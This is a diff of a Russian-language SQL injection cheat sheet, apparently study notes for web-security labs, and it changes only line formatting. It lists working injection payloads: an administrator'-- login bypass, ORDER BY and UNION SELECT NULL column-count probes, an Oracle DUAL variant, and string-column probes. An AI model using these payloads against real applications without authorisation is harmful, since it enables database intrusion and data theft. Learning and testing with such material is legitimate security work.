@@ -37,21 +37,21 @@ SQL-инъекция — это уязвимость веб-безопаснос
 Измените username параметр, присвоив ему значение:administrator'--
 <details>
 <summary><b></b>3. UNION-атака</b></summary>
--' ORDER BY 1--
--' ORDER BY 2--
--' ORDER BY 3--
--' UNION SELECT NULL--
--' UNION SELECT NULL,NULL--
--' UNION SELECT NULL,NULL,NULL--
+- ' ORDER BY 1--<br>
+- ' ORDER BY 2--<br>
+- ' ORDER BY 3--<br>
+- ' UNION SELECT NULL--<br>
+- ' UNION SELECT NULL,NULL--<br>
+- ' UNION SELECT NULL,NULL,NULL--<br>
 
 ### 3.1 UNION-атака (определение колонок в Oracle)
 В Oracle существует встроенная таблица dual, которую можно использовать для этой цели. Таким образом, внедряемые запросы в Oracle должны выглядеть следующим образом:
 - ' UNION SELECT NULL FROM DUAL--
 
 ### 3.2 UNION-атака (Поиск столбцов с полезным типом данных)
-- ' UNION SELECT 'a',NULL,NULL,NULL--
-- ' UNION SELECT NULL,'a',NULL,NULL--
-- ' UNION SELECT NULL,NULL,'a',NULL--
+- ' UNION SELECT 'a',NULL,NULL,NULL--<br>
+- ' UNION SELECT NULL,'a',NULL,NULL--<br>
+- ' UNION SELECT NULL,NULL,'a',NULL--<br>
 - ' UNION SELECT NULL,NULL,NULL,'a'--<br>
 
 Если ошибка не возникает, и ответ приложения содержит дополнительное содержимое, включая внедренное строковое значение, то соответствующий столбец подходит для извлечения строковых данных.
